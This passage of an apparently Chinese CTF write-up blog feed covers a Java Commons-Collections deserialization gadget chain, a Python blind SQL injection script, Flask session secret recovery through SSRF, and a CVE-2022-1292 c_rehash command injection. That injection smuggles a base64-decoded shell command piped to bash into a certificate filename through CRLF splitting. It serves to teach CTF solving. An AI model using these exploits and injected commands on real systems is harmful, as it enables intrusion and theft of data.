class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC5.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功执行</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520232836551.png" alt="image-20240520232836551"></p><h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><p>CC7也是CC6的改造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Payload method chain:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    java.util.Hashtable.readObject</span></span><br><span class="line"><span class="comment">    java.util.Hashtable.reconstitutionPut</span></span><br><span class="line"><span class="comment">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span></span><br><span class="line"><span class="comment">    java.util.AbstractMap.equals</span></span><br><span class="line"><span class="comment">    org.apache.commons.collections.map.LazyMap.get</span></span><br><span class="line"><span class="comment">    org.apache.commons.collections.functors.ChainedTransformer.transform</span></span><br><span class="line"><span class="comment">    org.apache.commons.collections.functors.InvokerTransformer.transform</span></span><br><span class="line"><span class="comment">    java.lang.reflect.Method.invoke</span></span><br><span class="line"><span class="comment">    sun.reflect.DelegatingMethodAccessorImpl.invoke</span></span><br><span class="line"><span class="comment">    sun.reflect.NativeMethodAccessorImpl.invoke</span></span><br><span class="line"><span class="comment">    sun.reflect.NativeMethodAccessorImpl.invoke0</span></span><br><span class="line"><span class="comment">    java.lang.Runtime.exec</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cc链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些题目</title>
      <link href="/2024/03/12/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/"/>
      <url>/2024/03/12/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>比较简单的bool注入,过滤了空格和&#x2F;**&#x2F;</p><p>这里无表名列名, 之前的无表名列名的注入手法都没成功</p><p>没想到猜了一手flag表flag列就出了</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key_of_true = <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://2b63de0f-491e-44ef-b06a-923f11aee2a8.node5.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">sql = <span class="string">&quot;(select(flag)from(flag))&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;a&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr(&quot;</span> + sql +<span class="string">&quot;,&#123;&#125;,1))&gt;&#123;&#125;,1,2)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">    mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">min</span> &lt; <span class="built_in">max</span>):</span><br><span class="line">        data[<span class="string">&#x27;id&#x27;</span>] = payload.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> key_of_true <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312234910906.png" alt="image-20240312234910906"></p><p>比较坑的点是sql语句必须要括号包裹</p><h2 id="CISCN-2019华东南-Web4"><a href="#CISCN-2019华东南-Web4" class="headerlink" title="[CISCN 2019华东南]Web4"></a>[CISCN 2019华东南]Web4</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! Read somethings&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>比较简单的一题, 之前做过类似的</p><p>读MAC</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/read?url=local_file:///sys/class/net/eth0/address</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.anna.nssctf.cn:28201</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>BD_UPN=12314753; session=eyJ1c2VybmFtZSI6eyIgYiI6ImNtOXZkQT09In1mUS5l7zFyQS64asbFTzEdi+wVkx5S0Cc4YzZOYVk=</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:02:de:d1</span><br><span class="line">0242ac02ded1</span><br></pre></td></tr></table></figure><p>python2下运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">0x0242ac02ded1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random() * <span class="number">233</span>))</span><br><span class="line"><span class="comment">#输出 175.043938323</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312013527918.png" alt="image-20240312013527918"></p><p>flask session伪造</p><p>读取flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312013549292.png" alt="image-20240312013549292"></p><h2 id="CISCN-2022-初赛-online-crt"><a href="#CISCN-2022-初赛-online-crt" class="headerlink" title="[CISCN 2022 初赛]online_crt"></a>[CISCN 2022 初赛]online_crt</h2><p>题目被标记了CVE-2022-1292, 直接开搜</p><p><a href="https://xz.aliyun.com/t/11703">https://xz.aliyun.com/t/11703</a></p><p>利用也非常的简单, 在crt证书的文件名中包含反引号包裹的shell命令, 之后使用c_rehash创建符号链接时, 包裹的命令就会被执行</p><p>题目给出了附件, 先看flask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> cryptography <span class="keyword">import</span> x509</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes, serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.x509.oid <span class="keyword">import</span> NameOID</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_crt</span>(<span class="params">Country, Province, City, OrganizationalName, CommonName, EmailAddress</span>):</span><br><span class="line">    root_key = rsa.generate_private_key(</span><br><span class="line">        public_exponent=<span class="number">65537</span>,</span><br><span class="line">        key_size=<span class="number">2048</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    subject = issuer = x509.Name([</span><br><span class="line">        x509.NameAttribute(NameOID.COUNTRY_NAME, Country),</span><br><span class="line">        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province),</span><br><span class="line">        x509.NameAttribute(NameOID.LOCALITY_NAME, City),</span><br><span class="line">        x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName),</span><br><span class="line">        x509.NameAttribute(NameOID.COMMON_NAME, CommonName),</span><br><span class="line">        x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress),</span><br><span class="line">    ])</span><br><span class="line">    root_cert = x509.CertificateBuilder().subject_name(</span><br><span class="line">        subject</span><br><span class="line">    ).issuer_name(</span><br><span class="line">        issuer</span><br><span class="line">    ).public_key(</span><br><span class="line">        root_key.public_key()</span><br><span class="line">    ).serial_number(</span><br><span class="line">        x509.random_serial_number()</span><br><span class="line">    ).not_valid_before(</span><br><span class="line">        datetime.datetime.utcnow()</span><br><span class="line">    ).not_valid_after(</span><br><span class="line">        datetime.datetime.utcnow() + datetime.timedelta(days=<span class="number">3650</span>)</span><br><span class="line">    ).sign(root_key, hashes.SHA256(), default_backend())</span><br><span class="line">    crt_name = <span class="string">&quot;static/crt/&quot;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;.crt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(crt_name, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(root_cert.public_bytes(serialization.Encoding.PEM))</span><br><span class="line">    <span class="keyword">return</span> crt_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getcrt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    Country = request.form.get(<span class="string">&quot;Country&quot;</span>, <span class="string">&quot;CN&quot;</span>)</span><br><span class="line">    Province = request.form.get(<span class="string">&quot;Province&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    City = request.form.get(<span class="string">&quot;City&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    OrganizationalName = request.form.get(<span class="string">&quot;OrganizationalName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    CommonName = request.form.get(<span class="string">&quot;CommonName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    EmailAddress = request.form.get(<span class="string">&quot;EmailAddress&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/createlink&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    json_data = &#123;<span class="string">&quot;info&quot;</span>: os.popen(<span class="string">&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;</span>).read()&#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(json_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    uri = request.form.get(<span class="string">&quot;uri&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    client = socket.socket()</span><br><span class="line">    client.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">8887</span>))</span><br><span class="line">    msg = <span class="string">f&#x27;&#x27;&#x27;GET <span class="subst">&#123;uri&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: test_api_host</span></span><br><span class="line"><span class="string">User-Agent: Guest</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    client.send(msg.encode())</span><br><span class="line">    data = client.recv(<span class="number">2048</span>)</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="keyword">return</span> data.decode()</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>这里有三条路由:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/getcrt : 创建一个crt证书, 并回显文件名</span><br><span class="line">/createlink : 使用c_rehash命令为创建的证书建立符号链接,  这里也就上面提到的cve命令关联了</span><br><span class="line">/proxy : 向服务器本地的8887端口发送get请求, 这里很容易看出来是有CRLF响应拆分漏洞</span><br></pre></td></tr></table></figure><p>关于响应拆分</p><p><a href="https://xz.aliyun.com/t/9707">https://xz.aliyun.com/t/9707</a></p><p>再看服务器本地运行的go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">staticPath := <span class="string">&quot;/app/static/crt/&quot;</span></span><br><span class="line">oldname := c.DefaultQuery(<span class="string">&quot;oldname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">newname := c.DefaultQuery(<span class="string">&quot;newname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> oldname == <span class="string">&quot;&quot;</span> || newname == <span class="string">&quot;&quot;</span> || strings.Contains(oldname, <span class="string">&quot;..&quot;</span>) || strings.Contains(newname, <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">c.String(<span class="number">500</span>, <span class="string">&quot;error&quot;</span>) </span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> c.Request.URL.RawPath != <span class="string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">err := os.Rename(staticPath+oldname, staticPath+newname)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, newname)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;no&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.GET(<span class="string">&quot;/&quot;</span>, index)</span><br><span class="line">router.GET(<span class="string">&quot;/admin/rename&quot;</span>, admin)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := router.Run(<span class="string">&quot;:8887&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易发现&#x2F;admin&#x2F;rename这条路由是更改我们创建的证书文件的文件名</p><p>与上面python的&#x2F;createlink路由的功能相结合就造成了CVE-2022-1292的利用点</p><p>首先创建一个证书并拿来文件名</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312155735785.png" alt="image-20240312155735785"></p><p>之后ssrf加响应拆分改文件名, 这里会踩坑,admin后的<code>/</code>必须url编码, 必须用form-data发包, 不然没有<code>\r\n</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312180041150.png" alt="image-20240312180041150"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/admin%2frename?oldname=7463b49b-69c6-49f5-8f3d-0d0f97161381.crt&amp;newname=`echo$&#123;IFS&#125;1$&#123;IFS&#125;&gt;a`.crt HTTP/1.1</span><br><span class="line">Host: admin</span><br><span class="line"></span><br><span class="line">GET /</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312180125110.png" alt="image-20240312180125110"></p><p>可以发现成功写入</p><p>但是这里文件名不能包含<code>/</code>, 稍微绕过一下</p><p>这里试了很多次base64来绕过但是没有成功</p><p>之后是尝试${PATH:0:1}来绕过, 也没成功,</p><p>有说用${OLDPWD}的, 这个变量是表示当前目录,这里也不是<code>/</code></p><p>最后还是base64绕过, base64的内容是cat &#x2F;*</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/admin%2frename?oldname=07fc2723-258b-4873-9011-e2df6a4041e6.crt&amp;newname=`echo$&#123;IFS&#125;Y2F0IC8qIA==|base64$&#123;IFS&#125;--decode|bash&gt;flag.txt`.crt HTTP/1.1</span><br><span class="line">Host: admin</span><br><span class="line"></span><br><span class="line">GET /</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312223845842.png" alt="image-20240312223845842"></p><h2 id="CISCN-2019华东南-Double-Secret"><a href="#CISCN-2019华东南-Double-Secret" class="headerlink" title="[CISCN 2019华东南]Double Secret"></a>[CISCN 2019华东南]Double Secret</h2><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">secret=request.args.get(<span 